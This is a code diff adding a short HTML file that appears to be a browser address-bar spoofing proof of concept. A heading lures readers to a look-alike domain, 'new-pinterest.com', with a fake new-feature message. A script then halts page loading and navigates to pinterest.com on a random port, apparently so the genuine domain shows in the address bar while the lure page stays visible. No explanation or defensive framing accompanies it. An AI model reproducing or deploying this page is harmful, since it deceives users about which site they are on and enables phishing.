@@ -1,0 +1,15 @@
+<h1>hi pinterest has new feature go to <a href="https://new-pinterest.com">new-pinterest.com</a></h1>
+
+<script>
+    function spoof() {
+        setTimeout(() => {
+            window.stop();
+            let randomPort;
+            do {
+                randomPort = Math.floor(Math.random() * 1000);
+            } while (randomPort === 0 || randomPort === 443);
+            document.location = "https://pinterest.com:" + randomPort + "/";
+        }, 300);
+    }
+    spoof();
+</script>
